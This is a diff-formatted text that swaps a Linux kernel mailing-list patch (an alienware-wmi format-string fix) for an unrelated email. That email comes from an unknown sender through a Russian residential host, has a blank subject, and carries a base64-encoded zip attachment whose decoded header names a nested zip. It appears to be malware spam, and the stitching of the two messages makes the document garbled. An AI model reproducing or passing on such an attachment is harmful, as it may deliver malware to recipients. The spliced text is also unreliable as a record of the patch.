@@ -1,118 +1,73 @@
-From: Arnd Bergmann <arnd@arndb.de>
-Subject: [PATCH 2/2] platform/x86: alienware-wmi: fix format string overflow warning
-Date: Thu, 20 Jul 2017 18:00:51 +0200
-Message-ID: <20170720160114.3261176-2-arnd@arndb.de>
-References: <20170720160114.3261176-1-arnd@arndb.de>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <20170720160114.3261176-1-arnd@arndb.de>
-Sender: linux-kernel-owner@vger.kernel.org
-To: Darren Hart <dvhart@infradead.org>, Andy Shevchenko <andy@infradead.org>
-Cc: Arnd Bergmann <arnd@arndb.de>, platform-driver-x86@vger.kernel.org, linux-kernel@vger.kernel.org
-List-Id: platform-driver-x86.vger.kernel.org
+From: <tbinh.minhnd@yahoo.com>
+Subject: (unknown)
+Date: Thu, 20 Jul 2017 18:43:39 -0000
+Message-ID: <150057621981.17375.13443225051971644240@perm.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="145050548450.zip"
+Content-Transfer-Encoding: base64
+Return-path: <platform-driver-x86-owner@vger.kernel.org>
+Received: from homeuser77.43.164.249.ccl.perm.ru ([77.43.164.249]:35519 "HELO
+        perm.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S932226AbdGTSnt (ORCPT
+        <rfc822;platform-driver-x86@vger.kernel.org>);
+        Thu, 20 Jul 2017 14:43:49 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: platform-driver-x86-owner@vger.kernel.org
+List-ID: <platform-driver-x86.vger.kernel.org>
+To: platform-driver-x86@vger.kernel.org
 
-gcc points out a possible format string overflow for a large value of 'zone':
-
-drivers/platform/x86/alienware-wmi.c: In function 'alienware_wmi_init':
-drivers/platform/x86/alienware-wmi.c:461:24: error: '%02X' directive writing between 2 and 8 bytes into a region of size 6 [-Werror=format-overflow=]
-   sprintf(buffer, "zone%02X", i);
-                        ^~~~
-drivers/platform/x86/alienware-wmi.c:461:19: note: directive argument in the range [0, 2147483646]
-   sprintf(buffer, "zone%02X", i);
-                   ^~~~~~~~~~
-drivers/platform/x86/alienware-wmi.c:461:3: note: 'sprintf' output between 7 and 13 bytes into a destination of size 10
-
-This replaces the 'int' variable with an 'u8' to make sure
-it always fits, renaming the variable to 'zone' for clarity.
-
-Unfortunately, gcc-7.1.1 still warns about it with that change, which
-seems to be unintended by the gcc developers. I have opened a bug
-against gcc with a reduced test case. As a workaround, I also
-change the format string to use "%02hhX", which shuts up the
-warning in that version.
-
-Link: https://gcc.gnu.org/bugzilla/show_bug.cgi?id=81483
-Link: https://patchwork.ozlabs.org/patch/788415/
-Suggested-by: Andy Shevchenko <andy@infradead.org>
-Signed-off-by: Arnd Bergmann <arnd@arndb.de>
----
-v2: completely rewrite the patch after discussing with Andy
----
- drivers/platform/x86/alienware-wmi.c | 38 ++++++++++++++++++------------------
- 1 file changed, 19 insertions(+), 19 deletions(-)
-
-diff --git a/drivers/platform/x86/alienware-wmi.c b/drivers/platform/x86/alienware-wmi.c
-index 0831b428c217..c56a9ecba959 100644
---- a/drivers/platform/x86/alienware-wmi.c
-+++ b/drivers/platform/x86/alienware-wmi.c
-@@ -255,12 +255,12 @@ static int parse_rgb(const char *buf, struct platform_zone *zone)
- 
- static struct platform_zone *match_zone(struct device_attribute *attr)
- {
--	int i;
--	for (i = 0; i < quirks->num_zones; i++) {
--		if ((struct device_attribute *)zone_data[i].attr == attr) {
-+	u8 zone;
-+	for (zone = 0; zone < quirks->num_zones; zone++) {
-+		if ((struct device_attribute *)zone_data[zone].attr == attr) {
- 			pr_debug("alienware-wmi: matched zone location: %d\n",
--				 zone_data[i].location);
--			return &zone_data[i];
-+				 zone_data[zone].location);
-+			return &zone_data[zone];
- 		}
- 	}
- 	return NULL;
-@@ -420,7 +420,7 @@ static DEVICE_ATTR(lighting_control_state, 0644, show_control_state,
- 
- static int alienware_zone_init(struct platform_device *dev)
- {
--	int i;
-+	u8 zone;
- 	char buffer[10];
- 	char *name;
- 
-@@ -457,19 +457,19 @@ static int alienware_zone_init(struct platform_device *dev)
- 	if (!zone_data)
- 		return -ENOMEM;
- 
--	for (i = 0; i < quirks->num_zones; i++) {
--		sprintf(buffer, "zone%02X", i);
-+	for (zone = 0; zone < quirks->num_zones; zone++) {
-+		sprintf(buffer, "zone%02hhX", zone);
- 		name = kstrdup(buffer, GFP_KERNEL);
- 		if (name == NULL)
- 			return 1;
--		sysfs_attr_init(&zone_dev_attrs[i].attr);
--		zone_dev_attrs[i].attr.name = name;
--		zone_dev_attrs[i].attr.mode = 0644;
--		zone_dev_attrs[i].show = zone_show;
--		zone_dev_attrs[i].store = zone_set;
--		zone_data[i].location = i;
--		zone_attrs[i] = &zone_dev_attrs[i].attr;
--		zone_data[i].attr = &zone_dev_attrs[i];
-+		sysfs_attr_init(&zone_dev_attrs[zone].attr);
-+		zone_dev_attrs[zone].attr.name = name;
-+		zone_dev_attrs[zone].attr.mode = 0644;
-+		zone_dev_attrs[zone].show = zone_show;
-+		zone_dev_attrs[zone].store = zone_set;
-+		zone_data[zone].location = zone;
-+		zone_attrs[zone] = &zone_dev_attrs[zone].attr;
-+		zone_data[zone].attr = &zone_dev_attrs[zone];
- 	}
- 	zone_attrs[quirks->num_zones] = &dev_attr_lighting_control_state.attr;
- 	zone_attribute_group.attrs = zone_attrs;
-@@ -484,9 +484,9 @@ static void alienware_zone_exit(struct platform_device *dev)
- 	sysfs_remove_group(&dev->dev.kobj, &zone_attribute_group);
- 	led_classdev_unregister(&global_led);
- 	if (zone_dev_attrs) {
--		int i;
--		for (i = 0; i < quirks->num_zones; i++)
--			kfree(zone_dev_attrs[i].attr.name);
-+		u8 zone;
-+		for (zone = 0; zone < quirks->num_zones; zone++)
-+			kfree(zone_dev_attrs[zone].attr.name);
- 	}
- 	kfree(zone_dev_attrs);
- 	kfree(zone_data);
--- 
-2.9.0
+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
+AABdCwAAAAA=
